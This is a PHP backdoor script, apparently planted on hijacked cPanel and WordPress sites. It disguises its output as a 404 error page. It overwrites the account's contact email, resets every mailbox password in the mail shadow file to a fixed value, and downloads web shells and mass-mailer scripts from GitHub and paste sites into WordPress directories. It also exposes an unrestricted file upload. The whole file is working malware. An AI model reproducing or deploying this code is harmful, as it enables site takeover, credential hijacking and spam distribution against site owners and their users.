set_time_limit(0);
error_reporting(0);
// $filt = getcwd();
// $filt = shell_exec('pwd');
// $filt = php_uname();
$filt =  __file__ ;
$fuck = explode("/",$filt);
$user = $fuck[2]; $_7mar = $fuck[1];
//$user = $fuck[3]; $_7mar = $fuck[1].'/'.$fuck[2];
$azerty = $_SERVER["SERVER_NAME"];
$abcd = dirname($_SERVER["PHP_SELF"]);
$sexterss = $azerty.$abcd;
$azzouz = $_SERVER['HTTP_HOST'];
$email666 = 'rotinabox@hotmail.com';
$email = "$email666"; $wr = 'email:'.$email;
$msg = "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['REQUEST_URI']." files was not found on this server.</p><h2 hidden>rotinabox@hotmail.com</h2><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>";
echo $msg;
$f = fopen("/".$_7mar."/".$user.'/.cpanel/contactinfo', 'w');fwrite($f, $wr);fclose($f);
$f = fopen("/".$_7mar."/".$user.'/.contactinfo', 'w');fwrite($f, $wr); fclose($f);
//system("user=$(whoami) ; rm -rf /$_7mar/$user/.cpanel/ ; cd /$_7mar/$user/ ; rm .contactemail ; echo '$email666' >> .contactemail ;");
//system("user=$(whoami) ; rm -rf /$_7mar/$user/.cpanel/ ; cd /$_7mar/$user/ ; rm .contactinfo ; echo 'email:$email666' >> .contactinfo ;");
if(isset($_GET['user'])){echo "<br><br><font color='red'>$user</font><br><br>";}
if(isset($_GET['rename'])){
rename("/$_7mar/$user/.cpanel/","/$_7mar/$user/7mar");
echo "<br><br><font color='red'>$user</font><br><br>";
}
#-#-#-#-#-#/*
if(isset($_GET['smtp'])){
set_time_limit(0);
ini_set('max_execution_time',0);
ini_set('memory_limit',-1);
$ports=array(25, 587, 465, 110, 995, 143 , 993);
$primary_port='25';
$user=get_current_user();
$password='roottn';
$pwd = crypt($password,'$6$roottn$');
 $t = $_SERVER['SERVER_NAME'];
 $t = @str_replace("www.","",$t);
@$passwd = file_get_contents('/home/'.$user.'/etc/'.$t.'/shadow');
$ex=explode("\r\n",$passwd);
@link('/home/'.$user.'/etc/'.$t.'/shadow','/home/'.$user.'/etc/'.$t.'/shadow.roottn.bak');
@unlink('/home/'.$user.'/etc/'.$t.'/shadow');
foreach($ex as $ex){
$ex=explode(':',$ex);
$e= $ex[0];
if ($e){
$b=fopen('/home/'.$user.'/etc/'.$t.'/shadow','ab');fwrite($b,$e.':'.$pwd.':16249:::::'."\r\n");fclose($b);
echo "<br><br><center><font color=red>".$t."|25|".$e."@".$t."|".$password."</font></center>";
}}
}
//if(isset($_GET['kill'])){$a = basename($_SERVER['SCRIPT_NAME']);echo "<br><font color='blue'>GIF89a</font>";unlink($a);unlink('js/hw.sh');unlink('js/.htaccess');}

function getfiles($download) {
if(function_exists("curl_init")) { 
$st = curl_init();
curl_setopt($st,CURLOPT_URL,$download);
curl_setopt($st,CURLOPT_RETURNTRANSFER, true);
curl_setopt($st,CURLOPT_RETURNTRANSFER,1);
curl_setopt($st,CURLOPT_FOLLOWLOCATION, 1);
$data = curl_exec($st);
curl_close($st);
return $data;
}
elseif(function_exists("file_get_contents")) { 
$data = file_get_contents($download);
return $data;
}
}

//$mailer = 'https://paste.in/raw/lR7JG9'; //NineMailer
//$mailer = 'https://paste.in/raw/1UhL7O'; //leaf_v2.7
//$shell = 'https://paste.in/raw/N7lCjf'; // lite_shell
//$shell = 'https://paste.in/raw/Jj4vAt'; // fox_shell
//$shell = 'https://paste.in/raw/AqzSZY'; // sts_shell
//$shell = 'https://paste.in/raw/mmbi3x'; // olux_decode_shell 
//$shell = 'https://pasteio.com/raw/xY9T7miNQJlC'; // readme_shell  

$shell = 'https://raw.githubusercontent.com/rotinabox/requests/main/olux_last_shell.php'; // olux_last_shell
$mailer = 'https://raw.githubusercontent.com/rotinabox/requests/main/leafmailer_v2.8.php'; //leaf_v2.8 
$test = 'https://raw.githubusercontent.com/rotinabox/requests/main/testsend.php'; //test_delivery

$input = array('leopard','lion','male','cock','drake','penguin','quail','rat','serval','swan','bear','baboon','alpaca','zebra','yak','wolf','turkey','toad','baby','calf','cria','chick','fawn','pup','kit','nymph','swarm');
$rand_keys = array_rand($input, 2);

if(isset($_GET['s1']) or isset($_GET['m1'])) {
$random = $input[$rand_keys[0]].rand(999, 123);
$dir = 'wp-admin/';
$rid = $abcd."/";
$pass = 'seller';
$leaf = $random; $system = $random; $tacos = $random;
}
if(isset($_GET['s2']) or isset($_GET['m2'])) {
$random = 'seller'.rand(999, 123);
$dir = 'wp-admin/';
$rid = 'wp-content/';
$pass = 'seller';
$leaf = $random; $system = $random; $tacos = $random;
}
if(isset($_GET['s3']) or isset($_GET['m3'])) {
$random = 'wso'.rand(999, 123);
$dir = 'wp-includes/';
$rid = 'wp-admin/';
$pass = 'seller';
$leaf = $random; $system = $random; $tacos = $random;
}
if(isset($_GET['s4']) or isset($_GET['m4'])) {
$random = 'css'.rand(999, 123);
$dir = 'wp-admin/';
$rid = $abcd."/";
$pass = 'seller';
$leaf = $random; $system = $random; $tacos = $random;
}
if(isset($_GET['s5']) or isset($_GET['m5'])) {
$random = $input[$rand_keys[0]].rand(999, 123);
$rid= "media/cms/";
$dir = $abcd."/";
$pass = 'seller';
$leaf = $random; $system = $random; $tacos = $random;
}
if(isset($_GET['s6']) or isset($_GET['m6'])) {
$random = rand(999, 12345).'nzxt';
$dir = "language/overrides/";
$rid = $abcd."/";
$pass = 'seller';
$leaf = $random; $system = $random; $tacos = $random;
}
if(isset($_GET['s7'])) {
$rid = "public_html/";
$dir = "public_html/";
$shell = $test;
$zok = 'file';
$system = $zok; 
}



echo "<center>";
if(isset($_GET['lite'])) {
$html = getfiles("http://ac6da53258c4301f.paste.se/raw");
$a3=fopen('rand.php','w');
fwrite($a3,$html);
fclose($a3);
echo "<a href="."http://$sexterss/rand.php"." target="."_blank".">$sexterss/rand.php"."</a><br>";
}
if(isset($_GET['scripts'])) {
$html = getfiles("http://pastebin.com/raw/exL9TkGi");
curl_close($st);
$a3=fopen('edite.php','w');
fwrite($a3,$html);
fclose($a3);
echo "<a href="."http://$sexterss/edite.php"." target="."_blank".">$sexterss/edite.php"."</a><br>";
echo "<a href="."https://pastebin.com/edit/exL9TkGi"." target="."_blank".">pastebin.com"."</a><br><br>";
}
if(isset($_GET['upload'])){
echo "<center><br><input onclick="."location.href='?kill';"." type='button' value='Supprimer'><br><br><br>";
$nemoshell = $_FILES['file']['name'];$nemohero  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='upload shell' /></form>"; 
move_uploaded_file($nemohero,$nemoshell);echo" <a href='$nemoshell' target='_blank'>$nemoshell</a></center>";
}
if(isset($_GET['get'])){
$html = getfiles("http://pastebin.com/raw/wL527WWg");
$a1=fopen('output.php','w');
fwrite($a1,$html);
$html = getfiles("http://pastebin.com/raw/nxJA9qiA");
$a2=fopen('authorze.php','w');
fwrite($a3,$html);
echo "<a href="."http://$sexterss/authorze.php"." target="."_blank".">$sexterss/authorze.php"."</a><br>";
echo "<a href="."http://$sexterss/views.php?pass=$pass"." target="."_blank".">$sexterss/views.php?pass=$pass"."</a><br>";
}	
$sss=array('./','../','../../','../../../','../../../../','../../../../../','../../../../../../');
foreach($sss as $pa){
if(isset($_GET['m1']) or isset($_GET['m2'])or isset($_GET['m3']) or isset($_GET['m4']) or isset($_GET['m5']) or isset($_GET['m6'])  or isset($_GET['m7'])) {	
$p1=array("$pa/$rid");
foreach($p1 as $path){	
if (file_exists("$path")){
$print = $path.$leaf.rand(999, 123).".php";
$html = getfiles($mailer);
$save=fopen($print,'w');
fwrite($save,$html);
$print = "__$print";
$print=str_replace(array("public_html","///","//","...","..","__...","__..","__.","__///","__//","__/"), "",$print);
echo "<a href="."http://$azzouz/$print?pass=$pass"." target="."_blank".">$azzouz/$print"."</a><br>";
break;
}
$p2=array("$pa/$dir");
foreach($p2 as $path){
if (file_exists("$path")){
$print = $path.$leaf.rand(999, 123).".php";
$html = getfiles($mailer);
$save=fopen($print,'w');
fwrite($save,$html);	
$print = "__$print";
$print=str_replace(array("public_html","///","//","...","..","__...","__..","__.","__///","__//","__/"), "",$print);
echo "<a href="."http://$azzouz/$print?pass=$pass"." target="."_blank".">$azzouz/$print"."</a><br>";
}}}}
if(isset($_GET['s1']) or isset($_GET['s2'])or isset($_GET['s3']) or isset($_GET['s4']) or isset($_GET['s5']) or isset($_GET['s6']) or isset($_GET['s7'])or isset($_GET['s8'])) {	
$p3=array("$pa/$dir");
foreach($p3 as $path){	
if (file_exists("$path")){
$print = $path.$system.".php";
$html = getfiles($shell);
$save=fopen($print,'w');
fwrite($save,$html);	
$print = "__$print";
$print=str_replace(array("public_html","///","//","...","..","__...","__..","__.","__///","__//","__/"), "",$print);
echo "<a href="."http://$azzouz/$print"." target="."_blank".">$azzouz/$print"."</a><br>";
break;
}
$p4=array("$pa/$rid");
foreach($p4 as $path){
if (file_exists("$path")){
$print = $path.$system.".php";
$html = getfiles($shell);
$save=fopen($print,'w');
fwrite($save,$html);	
$print = "__$print";
$print=str_replace(array("public_html","///","//","...","..","__...","__..","__.","__///","__//","__/"), "",$print);
echo "<a href="."http://$azzouz/$print"." target="."_blank".">$azzouz/$print"."</a><br>";
}}}}
$p5=array("$pa/wp-content/themes/"); 
if(isset($_GET['shell2'])){
foreach($p5 as $path){	
if (file_exists("$path")){
$print = $path.$tacos.rand(999, 123).".php";
$html = getfiles($shell);
$save=fopen($print,'w');
fwrite($save,$html);	
$print = "__$print";
$print=str_replace(array("public_html","///","//","...","..","__...","__..","__.","__///","__//","__/"), "",$print);
echo "<a href="."http://$azzouz/$print"." target="."_blank".">$azzouz/$print"."</a><br>";
break;
}
$p6=array("$pa/wp-admin/"); 
foreach($p6 as $path){
if (file_exists("$path")){
$print = $path.$tacos.rand(999, 123).".php";
$html = getfiles($shell);
$save=fopen($print,'w');
fwrite($save,$html);
$print = "__$print";
$print=str_replace(array("public_html","///","//","...","..","__...","__..","__.","__///","__//","__/"), "",$print);
echo "<a href="."http://$azzouz/$print"." target="."_blank".">$azzouz/$print"."</a><br>";
}}}}}

#-#-#-#-#-#*/
